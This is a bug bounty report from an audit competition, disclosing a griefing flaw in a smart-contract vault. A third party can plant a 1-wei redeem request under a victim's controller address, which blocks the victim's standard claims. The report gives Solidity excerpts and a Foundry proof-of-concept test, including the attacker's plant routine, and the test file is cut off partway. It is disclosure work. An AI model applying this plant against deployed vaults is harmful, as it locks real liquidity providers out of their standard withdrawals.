# \#99982 [SC-Low] TrancheVault.requestRedeem lets any share owner name another account as controller, so a 1 wei request blocks that account's redeem and withdraw until it claims a refund that restarts its cooldown

**Submitted on Nov 16th 2026 at 00:12:28 UTC by @hybridthegeek for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99982
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`TrancheVault` is the ERC-7540 vault that holds pending LP deposits and funded withdrawals for the Senior and Junior tranches. `requestRedeem(shares, controller, owner)` checks only the share owner and accepts any non-zero `controller`, so any LP can add a redemption request to another account's claim list without that account's consent. A request of 1 share wei, placed in an epoch with no other redeemer, is refunded at settlement and then stays at the head of the victim's list. While it is there, the victim's `redeem`, `withdraw`, `maxRedeem` and `maxWithdraw` revert or return 0 for every later funded redemption. The only call that removes it, `claimRedeemRefund`, delivers the stranger's share to the victim and restarts the victim's one hour cooldown on its whole balance.

No privileged role is involved. No USDG is lost, and the victim can still be paid in full through the non-standard `claimRedeem(requestId, ...)`. I am reporting this as griefing, not as a freeze.

## Vulnerability Details

**1. The request names a controller that never agreed.** The owner side is fully checked (cooldown, balance, allowance or operator). The controller is only checked for the zero address, and the position is then queued under it.

```solidity
// packages/perps/src/TrancheVault.sol:611-630
        if (controller == address(0) || owner == address(0)) {
            revert TrancheVault__ZeroAddress();
        }
        if (shares == 0) {
            revert TrancheVault__WithdrawalTooSmall();
        }
        if (block.timestamp < lastDepositTime[owner] + DEPOSIT_COOLDOWN) {
            revert TrancheVault__DepositCooldown();
        }
        uint256 maxShares = maxRequestRedeem(owner);
        if (shares > maxShares) {
            revert TrancheVault__ExceededMaxRequestRedeem(owner, shares, maxShares);
        }
        _requireMinimumRedeemSize(shares, maxShares);
        if (msg.sender != owner && !isOperator[owner][msg.sender]) {
            _spendAllowance(owner, msg.sender, shares);
        }
        _transfer(owner, address(this), shares);

        requestId = _enqueueRedeemRequest(shares, controller);
```

`_enqueueRedeemRequest` (`packages/perps/src/TrancheVault.sol:688-708`) appends the epoch to the controller's linked list when the controller has no position in that epoch yet.

**2. A 1 wei request is legal.** The minimum size is waived when the request is the owner's whole balance, so an address that holds exactly 1 share wei can redeem it.

```solidity
// packages/perps/src/TrancheVault.sol:1611-1618
    function _requireMinimumRedeemSize(
        uint256 shares,
        uint256 maxShares
    ) internal view {
        if (estimateRedeemAssets(shares) < POOL.minTrancheDepositAssets() && shares < maxShares) {
            revert TrancheVault__WithdrawalTooSmall();
        }
    }
```

An attacker reaches that state by depositing the 1 USDG minimum, waiting out its own cooldown, and transferring 1 share wei to a second address it controls.

**3. Settlement refunds the dust epoch instead of funding it.** When the head redemption epoch of a tranche quotes to zero assets and nothing was funded earlier in the same call, `HousePool` refunds the remainder and marks the epoch refundable (`packages/perps/src/HousePool.sol:957-987`). One share wei is worth 0 USDG atoms, so an epoch that contains only the planted request always takes this branch.

**4. Standard claims and views read only the head of the controller's list.**

```solidity
// packages/perps/src/TrancheVault.sol:998-1012
    function withdraw(
        uint256 assets,
        address receiver,
        address controller
    ) public override returns (uint256 shares) {
        return _claimWithdraw(controllerRedeemHead[controller], assets, receiver, controller);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address controller
    ) public override returns (uint256 assets) {
        return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
    }
```

`maxWithdraw` and `maxRedeem` do the same (`packages/perps/src/TrancheVault.sol:1299-1311`). The refunded head has no funded shares, so both views return 0 and `_claimRedeem` reverts `ERC4626ExceededMaxRedeem(controller, shares, 0)` (`packages/perps/src/TrancheVault.sol:1158-1162`). A later epoch that is fully funded for the victim does not move the head.

**5. The only way to remove the head restarts the victim's cooldown.** A refundable position leaves the list only when `refundClaimed` is set (`packages/perps/src/TrancheVault.sol:1216-1227`), and only `claimRedeemRefund` sets it. That function requires the controller or its operator, requires the receiver to be the controller, and stamps the receiver's cooldown whenever the refund is not zero.

```solidity
// packages/perps/src/TrancheVault.sol:927-945
        if (!epoch.refundEnabled || position.refundClaimed || position.shares == 0) {
            revert TrancheVault__RedeemRefundUnavailable();
        }
        shares = refundableRedeemRequest(requestId, controller);
        _requireShareReceiver(controller, receiver);
        position.refundClaimed = true;
        epoch.refundBasisClaimed += position.shares;
        if (shares != 0) {
            position.refundedShares += shares;
            epoch.refundedShares += shares;
            pendingRedeemEscrowShares -= shares;
        }
        _maybeProcessRedeemFunding(controller, requestId);
        _sweepRedeemRefundDust(epoch);
        _maybeCloseRedeemPosition(controller, requestId);
        if (shares != 0) {
            lastDepositTime[receiver] = block.timestamp;
            _transfer(address(this), receiver, shares);
        }
```

`DEPOSIT_COOLDOWN` is 1 hour (`packages/perps/src/TrancheVault.sol:38`). During it, `requestRedeem` reverts for the victim (`packages/perps/src/TrancheVault.sol:617-619`) and so does any share transfer out (`packages/perps/src/TrancheVault.sol:325-328`). Cancelling the planted request before it matures has the same effect, and after maturity cancellation is not available.

**The documented guarantee that breaks.** The interface documents the head rule and then states the purpose of the receiver restriction:

```solidity
// packages/perps/src/interfaces/IAsyncTrancheVault.sol:12-14
///      a later HousePool call. Deposit claims and redemption cancellations/refunds require receiver == controller,
///      including zero-share acknowledgements, so share delivery cannot impose another account's cooldown or depend
///      on an unsolicited receiver balance. Approved operators may execute these actions for the controller.
```

Here an unsolicited share from a stranger is exactly what the controller must accept, with a cooldown, to get its standard claim calls back. The interface also says that a "refundable redeem head must be cancelled or reclaimed before standard claims advance" (`packages/perps/src/interfaces/IAsyncTrancheVault.sol:8-10`). It does not say that a third party can create that head for someone else.

**Comparison with known items.** I read the full text of each of these.

- Cecuro LOW-40, "Controller can force a zero-balance receiver into LP cooldown" (fix `efcf629a`). There the attacker chose the share receiver and stamped it directly. The fix forces `receiver == controller`. In this report the attacker chooses the controller of a request, and the stamp happens when the victim makes the only call that clears its list. This is not a bypass of that fix as written, because the attacker cannot stamp the victim by itself. It is a neighbouring path that reaches the outcome the fix was meant to remove.
- Cecuro LOW-39, "Front-runner can block third-party vault share claims by dusting the receiver" (same fix). That was a receiver balance check, now removed. Different root cause.
- Cecuro LOW-43, on `max*` views taking the controller. It documents whose limit the views report. It does not cover a third party setting them to zero.
- Cecuro MED-24, "LP can delay other redeemers with zero-payout refund epochs" (accepted). It uses the same dust epoch, but the harm there is the global 16 epoch work cap per settlement call. This report is about the per-controller claim list and needs one dust epoch, not many.
- Cecuro LOW-67, "Same-window redeemer can burn a small LP's shares for no assets" (accepted). It explains what happens when another LP redeems in the planted epoch: the head is funded with 1 share for 0 assets. I cover that case under Impact Details.
- `packages/perps/SECURITY.md`, "LP claim and allocation limitations": it lists `receiver == controller`, zero entitlement for dust, and zero-payout epochs delaying later epochs. It does not mention a request made under another account's controller.
- The AI scan and the pre-audit report have no item on the `controller` argument of `requestRedeem`.

A reviewer could read the documented head rule plus the accepted dust items as covering this. My view is that they cover every ingredient except the one that makes it an attack on someone else: the missing consent check on `controller`.

## Impact Details

All figures below are test values from the proof of concept, at the release parameters, with a 100,000 USDG Junior position for the victim.

What the victim loses:

- Its standard ERC-7540 claim calls stop working. With 49,999.999978 USDG funded and waiting in vault escrow, `maxRedeem` and `maxWithdraw` return 0 and `redeem` and `withdraw` revert. The state does not clear with time: it was unchanged 25 hours later. The same happens on the Senior vault (20,000.7306 USDG funded, standard view 0).
- To restore those calls it must call `claimRedeemRefund`, which locks `requestRedeem` and transfers on its whole remaining balance (about 49,999.999971 USDG of shares) for exactly 3,600 seconds.
- The attack repeats every hourly epoch. In a 26 epoch run (95,399 seconds), a victim that cleared each planted head as it appeared was locked at all 26 mid-epoch checks.

What it costs the attacker: 1 share wei per plant (which ends up with the victim) and 313,554 gas on average for the two calls (472,009 for the first plant). The victim's clearing call cost 107,487 gas on average. The attacker gains nothing.

What is not affected:

- No USDG is lost or sent to the wrong party. After either escape the victim is paid the same amount it could claim before the attack.
- The funds are not frozen. `claimRedeem(requestId, ...)` with the explicit epoch id pays the full funded amount at once and sets no cooldown. A victim that never clears the planted head is never locked, and a victim that requests the rest of its balance before clearing loses nothing to the cooldown. The proof of concept shows both.
- If another LP redeems in the planted epoch, the head is funded with 1 share for 0 assets. `redeem(1)` then clears it with no cooldown, and only callers that use `withdraw` stay blocked. If the plant lands in the same epoch as the victim's own request, it merges into the victim's position and nothing is blocked.

Preconditions, stated plainly: the planted epoch must have no other redeemer in that tranche, it must be earlier than the victim's request, and the victim (or its front end or integration) must rely on the standard head-based calls. I could not check the last point, because the repository has no front end or integrator code that shows which claim path LPs are given.

Why this is the griefing row and not a freeze row. "Temporary freezing of funds for at least 1 hour" and the 24 hour row both need funds the owner cannot reach. That is not the case here, since the explicit-id claim always pays and the one hour lock can be avoided by ordering. Claiming either row would contradict my own tests.

Why I am not rating it lower: The damage is aimed at a chosen LP, costs the attacker close to nothing, can be repeated every hour on both tranches, and needs no mistake by the victim to disable its standard claim calls.

Suggested fix: require consent for the controller in `requestRedeem`, for example `controller == owner` or the owner being an approved operator of the controller. Either of these would also work: let standard claims skip refundable heads, or skip the cooldown stamp when the refunded shares did not come from the receiver. I did not test a fix, because the proof of concept rules do not allow changing the contracts in scope.

## References

- `requestRedeem`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632
- `_enqueueRedeemRequest`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L688-L708
- `claimRedeemRefund`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L947
- `withdraw` and `redeem`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1012
- `_maybeCloseRedeemPosition`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1216-L1227
- `maxWithdraw` and `maxRedeem`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311
- `_requireMinimumRedeemSize`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1618
- Zero-quote refund branch: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L987
- Interface notes: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IAsyncTrancheVault.sol#L8-L17
- LP claim and allocation limitations: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md
- Cecuro AI audit (LOW-39, LOW-40, LOW-43, LOW-67, MED-24): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf
- AI scan findings: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md
- Program page: https://immunefi.com/audit-competition/plether/scope/

## Proof of Concept

## Proof of Concept

### Environment

- Repository: `https://github.com/immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` (the commit in scope). `packages/perps/src` is unmodified.
- Toolchain as printed: `forge Version: 1.7.1` (commit `4072e48705af9d93e3c0f6e29e93b5e9a40caed8`), compiling with `Solc 0.8.35`, using the repository's `packages/perps/foundry.toml` (`via_ir = true`, optimizer 200 runs).
- OS: Microsoft Windows 11.0.26200.
- Files added: `packages/perps/test/submission/ReleaseBase.sol` (helper) and `packages/perps/test/submission/RedeemHeadPlant.t.sol` (the tests). Both are given in full below.
- The helper extends the repository's own `packages/perps/test/perps/BasePerpTest.sol`, which deploys the full stack, and overrides its hooks so the risk parameters, the 1 USDG tranche seeds, the router values and the Senior caps match the release values in `packages/perps/DEPLOYMENT.md`.
- Mocks: the Pyth contract (`MockPyth`, two synthetic feeds) and USDG (`MockSettlementToken`, a plain 6 decimal ERC-20), both from the repository's test tree. Everything else is the real code at the commit: `TrancheVault` (both instances), `HousePool`, `CfdEngine`, `MarginClearinghouse`, `OrderRouter` and the oracle wrapper.
- The mocked price plays no part in the result. There are no open trader positions in any test, the mark is refreshed at 1.00 only so that settlement has a fresh mark, and LP settlement runs through the permissionless `HousePool.settleLpEpoch(0, 0)`. The attacker never sets a price.
- The tests call only production functions on the vault and pool: `requestDeposit`, `claimDeposit`, `requestRedeem`, `transfer`, `redeem`, `withdraw`, `claimRedeem`, `claimRedeemRefund`, `cancelRedeemRequest`, `setOperator`, `settleLpEpoch`, and `updateMarkPrice` on the router.

No transaction is sent to any live network.

### Steps

1. Get the code at the commit in scope.

```bash
git clone https://github.com/immunefi-team/audit-comp-plether
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```

2. Save the two files from the "PoC source" sections below at these paths:

```text
packages/perps/test/submission/ReleaseBase.sol
packages/perps/test/submission/RedeemHeadPlant.t.sol
```

3. Run the test file.

```bash
forge test --root packages/perps --match-path test/submission/RedeemHeadPlant.t.sol -vv
```

I ran step 3 in an existing checkout at the commit, with `FOUNDRY_SPARSE_MODE=true` and `FOUNDRY_DYNAMIC_TEST_LINKING=true` set in the environment. These two settings only limit how much of the test tree is compiled. Without them the first build compiles the whole perps test tree and takes much longer. I did not run the command without them, and I did not repeat steps 1 and 2 from a fresh clone.

### Expected result

```text
Ran 13 tests for test/submission/RedeemHeadPlant.t.sol:RedeemHeadPlant
[PASS] test_Attack_StandardClaimSurfaceDeadWhileFundedUsdgSitsInEscrow() (gas: 1549921)
Logs:
  attack: funded USDG behind a dead standard surface 49999999978
[PASS] test_Benign_VictimRedeemsThroughStandardSurface() (gas: 974934)
Logs:
  benign: USDG paid by standard redeem 49999999982
[PASS] test_Control_SameDustUnderPlantersOwnController_NoEffect() (gas: 1516364)
[PASS] test_EscapeA_ExplicitIdClaimPaysImmediately_NoCooldown_HeadStaysPinned() (gas: 2126560)
[PASS] test_EscapeB_RefundClaimClearsHead_ButStampsOneHourCooldownOnWholeBalance() (gas: 1986669)
Logs:
  clear gas (claimRedeemRefund) 108015
  locked share-wei for 3600s 50079074780004
  locked value in USDG atoms (approx) 49999999971
[PASS] test_Escape_PreMaturityCancelAlsoStampsCooldown() (gas: 426341)
[PASS] test_Limit_RequestBeforeClearAvoidsTheLock() (gas: 2139288)
[PASS] test_Limit_VictimWhoIgnoresPlantsIsNeverLocked() (gas: 2447691)
[PASS] test_Reach_DustNeedsWholeBalanceOwner_AndNoVictimConsent() (gas: 736360)
Logs:
  plant gas (transfer + requestRedeem) 472009
[PASS] test_Repeat_ReplantEveryEpoch_VictimWhoClearsEachHeadStaysLocked() (gas: 15573746)
Logs:
  rounds 26
  elapsed seconds 95399
  attacker gas per plant (transfer + requestRedeem) 313554
  victim gas per clear (claimRedeemRefund) 107487
  attacker share-wei spent 26
[PASS] test_Senior_SamePlantPinsSeniorControllerHead() (gas: 3106315)
Logs:
  senior: funded USDG behind a dead standard surface 20000730600
[PASS] test_Vary_BusyEpoch_FundedZeroAssetHead_RedeemClearsWithdrawCannot() (gas: 1762737)
[PASS] test_Vary_SameEpochMerge_NoPin() (gas: 1076414)
Suite result: ok. 13 passed; 0 failed; 0 skipped; finished in 97.54ms (129.56ms CPU time)
Ran 1 test suite in 113.41ms (97.54ms CPU time): 13 tests passed, 0 failed, 0 skipped (13 total tests)
```

Compiler warnings printed before these lines are omitted. Gas figures and timings can vary with the toolchain version. The pass condition is `13 passed; 0 failed`.

### What each test asserts

- `test_Benign_VictimRedeemsThroughStandardSurface`: with no attacker, the victim's request becomes the head of its list, `maxRedeem` reports the funded shares, and the standard `redeem` pays the full funded amount. This shows the harness models the normal flow.
- `test_Control_SameDustUnderPlantersOwnController_NoEffect`: the same 1 wei request in the same quiet epoch, but with the planter as its own controller, leaves the victim's standard claim working. Only the `controller` argument differs from the attack, which isolates it as the cause.
- `test_Reach_DustNeedsWholeBalanceOwner_AndNoVictimConsent`: a 1 wei request from the attacker's main balance is rejected as too small. From an address whose whole balance is 1 wei it succeeds with the victim as controller, although the victim gave no operator approval and no allowance. The victim's list head becomes the planted epoch and the attacker has spent exactly 1 share wei.
- `test_Attack_StandardClaimSurfaceDeadWhileFundedUsdgSitsInEscrow`: after both epochs settle, the planted epoch is refundable and still the head, the victim's own epoch is fully funded, `maxRedeem` and `maxWithdraw` are 0, and `redeem`, `withdraw` and a 1 share `redeem` all revert with a maximum of 0. The victim cannot cancel the planted request. All of this is unchanged 25 hours later, and the vault escrow identities hold.
- `test_EscapeA_ExplicitIdClaimPaysImmediately_NoCooldown_HeadStaysPinned`: `claimRedeem` with the explicit epoch id pays the full funded amount and sets no cooldown, and the victim can transfer and request again at once. The planted head remains, so the standard views are still 0 for the victim's next funded request.
- `test_EscapeB_RefundClaimClearsHead_ButStampsOneHourCooldownOnWholeBalance`: an operator cannot send the refund to another receiver, and the attacker cannot make the clearing call. The victim's `claimRedeemRefund` delivers 1 share wei, sets its cooldown to the current time and advances the head, after which the standard `redeem` pays the same amount as before the attack. `requestRedeem` and transfers of the remaining balance then revert until exactly 3,600 seconds later (still reverting at 3,599).
- `test_Limit_RequestBeforeClearAvoidsTheLock`: a victim that requests redemption of its remaining balance before clearing the head exits in full on schedule. This shows the one hour lock is avoidable.
- `test_Escape_PreMaturityCancelAlsoStampsCooldown`: cancelling the planted request before it matures clears the head but also restarts the victim's cooldown.
- `test_Vary_SameEpochMerge_NoPin`: a plant in the same epoch as the victim's own request merges into the victim's position, the epoch is funded, and the standard claim works.
- `test_Vary_BusyEpoch_FundedZeroAssetHead_RedeemClearsWithdrawCannot`: when another LP redeems in the planted epoch, the head is funded with 1 share for 0 assets. `withdraw` reverts, `redeem(1)` pays 0 and removes the head with no cooldown, and the victim's claim is then paid.
- `test_Repeat_ReplantEveryEpoch_VictimWhoClearsEachHeadStaysLocked`: over 26 consecutive hourly epochs, each plant becomes a refundable head, and a victim that clears each one cannot request a redemption at any of the 26 mid-epoch checks. The attacker loses 1 share wei per round and the victim receives it. Average gas for the plant and for the clearing call is logged.
- `test_Limit_VictimWhoIgnoresPlantsIsNeverLocked`: with three planted heads left in place, the victim is never put in cooldown, can request its whole balance, and is paid in full through the explicit-id claim, while the standard view stays 0.
- `test_Senior_SamePlantPinsSeniorControllerHead`: the same steps on the Senior vault give a refundable head, a funded victim epoch of about 20,000 USDG, a standard view of 0, a reverting `redeem`, and full payment through the explicit id.

### What the PoC shows and what it does not show

It shows that an address with no approval from the victim can place a request in the victim's claim list for 1 share wei, that the victim's standard ERC-7540 claim calls and views then stop working while its funded USDG is in escrow, that the only call restoring them restarts the victim's one hour cooldown on its whole balance, and that this can be repeated every epoch on both tranches.

It does not show any loss of USDG, and it does not show a freeze: two of the tests prove the victim can always be paid through the explicit-id claim and can avoid the lock. It does not show that real LPs use the head-based standard calls, since the repository has no front end or integrator to test against. All amounts are fixture values chosen for the test (100,000 USDG and 20,000 USDG positions), not live balances; the perps contracts are not deployed on a main network. The attack needs an epoch with no other redeemer in that tranche, which the test arranges and a live market may not always offer. Pyth and USDG are mocks, and the basket uses two synthetic feeds, although no result depends on a price. Epochs are advanced with `vm.warp`, so sequencer timing and competing transactions are not modelled. The recommended fix is not tested, because the contracts in scope may not be modified. Gas figures come from the Foundry test environment and will differ on Arbitrum.

## PoC source: packages/perps/test/submission/ReleaseBase.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/// @dev Shared proof-of-concept base. Applies the release parameters from packages/perps/DEPLOYMENT.md and only
///      reaches production surfaces: the V3 `commitOrder`, `executeOrder`, `settleLpEpoch` and vault ERC-7540 calls.
///      Replaced by mocks: Pyth (two synthetic feeds rather than six) and USDG. No in-scope contract is modified.
///      Inherited helpers `_open`, `_close`, `_fundTrancheAsync` and `_settleLpEpochForTest` prank the Router and
///      are for exploration only. A filed proof of concept must use the helpers in this file instead.
abstract contract ReleaseBase is BasePerpTest {

    /// @dev Monday 2024-03-11 14:00 UTC, outside the frozen and FAD windows.
    uint256 internal constant LIVE_MONDAY = SETUP_TIMESTAMP + 7 days + 4 hours;
    uint256 internal constant RELEASE_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant RELEASE_MAX_SENIOR_SHARE_BPS = 8000;

    uint256 private _clientNonce;

    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function setUp() public virtual override {
        super.setUp();
        _applyReleaseConfig();
        vm.warp(LIVE_MONDAY);
        vm.roll(block.number + 1);
    }

    function _applyReleaseConfig() internal {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = 1000e6;
        config.maxPendingOrders = 5;
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.basketMaxConfidenceRatioBps = 10;
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        _setSeniorCapacity(RELEASE_MAX_SENIOR_EXPOSURE_ASSETS, RELEASE_MAX_SENIOR_SHARE_BPS);
        assertEq(engine.settlementBufferBps(), 25, "release settlementBufferBps");
        assertEq(engine.executionFeeBps(), 4, "release executionFeeBps");
    }

    // --- Production order surface ---

    /// @dev Target price semantics, from the harness adapter: a LONG open or SHORT close uses a floor (1 is unbounded),
    ///      a LONG close or SHORT open uses a ceiling (type(uint256).max is unbounded).
    function _commitV3(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal returns (uint64 orderId) {
        uint256 maxWindow = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("order", account, ++_clientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(maxWindow),
                executionWindowSeconds: uint32(maxWindow),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        orderId = router.commitOrder(request);
    }

    function _executeV3(
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory data = _mockPythUpdateData(price);
        result = router.executeOrder{value: 1}(orderId, data);
    }

    /// @dev Permissionless mark refresh through the Router. Required before the first open: commits read the cached mark.
    function _refreshMark(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        router.updateMarkPrice{value: 1}(data);
    }

    /// @dev Settles through the route production requires: the Router with live open positions outside the frozen
    ///      state, otherwise the permissionless direct cached-mark path.
    function _settleProduction(
        uint256 price
    ) internal {
        ICfdEngineTypes.TerminalNavSnapshot memory snapshot = engine.terminalNavSnapshot();
        if (snapshot.hasOpenPositions && !engine.isOracleFrozen()) {
            bytes[] memory data = _mockPythUpdateData(price);
            router.settleLpEpoch{value: 1}(data);
        } else {
            pool.settleLpEpoch(0, 0);
        }
    }

    // --- Production LP surface ---

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _requestRedeem(
        TrancheVault vault,
        address lp,
        uint256 shares
    ) internal returns (uint256 requestId) {
        vm.prank(lp);
        requestId = vault.requestRedeem(shares, lp, lp);
    }

    /// @dev Requests, warps to the boundary, settles at `price`, claims, and returns to the caller. Warps time.
    function _depositAndClaim(
        TrancheVault vault,
        address lp,
        uint256 amount,
        uint256 price
    ) internal returns (uint256 shares) {
        uint256 requestId = _requestDeposit(vault, lp, amount);
        uint256 activation = vault.depositEpochStart(requestId);
        if (block.timestamp < activation) {
            vm.warp(activation);
        }
        _settleProduction(price);
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, amount, lp, lp);
    }

}
```

## PoC source: packages/perps/test/submission/RedeemHeadPlant.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {ReleaseBase} from "./ReleaseBase.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Proof of concept: a third party plants a redeem request under a victim controller in TrancheVault.
///      Release-parameter harness; mocks are only Pyth and USDG (inherited). No in-scope source is
///      modified and only production surfaces are called: requestDeposit / claimDeposit / requestRedeem / transfer /
///      redeem / withdraw / claimRedeem / claimRedeemRefund / cancelRedeemRequest / setOperator on TrancheVault,
///      HousePool.settleLpEpoch(0,0) (permissionless with no open positions) and Router.updateMarkPrice.
contract RedeemHeadPlant is ReleaseBase {

    address internal VICTIM = makeAddr("victim");
    address internal ATTACKER = makeAddr("attacker");
    address internal MULE = makeAddr("attackerMule");
    address internal OTHER = makeAddr("otherLp");
    address internal OPERATOR = makeAddr("victimOperator");

    uint256 internal constant VICTIM_DEPOSIT = 100_000e6;
    uint256 internal constant ATTACKER_DEPOSIT = 1e6; // HousePool.MIN_TRANCHE_DEPOSIT_ASSETS

    uint256 internal victimShares;
    uint256 internal attackerShares;

    function setUp() public override {
        super.setUp();
        assertEq(pool.minTrancheDepositAssets(), ATTACKER_DEPOSIT, "release minimum deposit is 1 USDG");
        victimShares = _depositSettleClaim(VICTIM, VICTIM_DEPOSIT);
        attackerShares = _depositSettleClaim(ATTACKER, ATTACKER_DEPOSIT);
        _depositSettleClaim(OTHER, 10_000e6);
        // Every activation cooldown has elapsed before any scenario starts.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        vm.roll(block.number + 1);
    }

    // ------------------------------------------------------------------ helpers

    function _settleAt(
        uint256 epochId
    ) internal {
        uint256 start = juniorVault.depositEpochStart(epochId);
        if (vm.getBlockTimestamp() < start) {
            vm.warp(start);
            vm.roll(block.number + 1);
        }
        _refreshMark(1e8);
        _settleProduction(1e8);
    }

    function _depositSettleClaim(
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        uint256 requestId = _requestDeposit(juniorVault, lp, amount);
        _settleAt(requestId);
        vm.prank(lp);
        shares = juniorVault.claimDeposit(requestId, amount, lp, lp);
    }

    function _refundEnabled(
        uint256 epochId
    ) internal view returns (bool enabled) {
        (,,,,,,,,, enabled) = juniorVault.redeemEpochs(epochId);
    }

    function _epochShares(
        uint256 epochId
    ) internal view returns (uint256 shares, uint256 fundedShares, uint256 fundedAssets) {
        (shares, fundedShares, fundedAssets,,,,,,,) = juniorVault.redeemEpochs(epochId);
    }

    /// @dev Moves past the cutoff of `epochId` (so the next request targets epochId + 1) without reaching its start.
    function _warpPastCutoff(
        uint256 epochId
    ) internal {
        vm.warp(juniorVault.depositEpochStart(epochId) - 4 minutes);
        vm.roll(block.number + 1);
    }

    /// @dev The attacker's whole plant: 1 share-wei to a mule, mule redeems its entire (dust) balance to `controller`.
    function _plant(
        address controller
    ) internal returns (uint256 epochId, uint256 gasUsed) {
        vm.prank(ATTACKER);
        uint256 g0 = gasleft();
        juniorVault.transfer(MULE, 1);
        gasUsed = g0 - gasleft();
        vm.prank(MULE);
        g0 = gasleft();
        epochId = juniorVault.requestRedeem(1, controller, MULE);
        gasUsed += g0 - gasleft();
    }

    function _escrowInvariant() internal view {
        assertEq(
            juniorVault.balanceOf(address(juniorVault)),
            juniorVault.depositClaimEscrowShares() + juniorVault.pendingRedeemEscrowShares(),
            "vault share escrow == claim escrow + pending redeem escrow"
        );
        assertGe(
            settlementToken.balanceOf(address(juniorVault)),
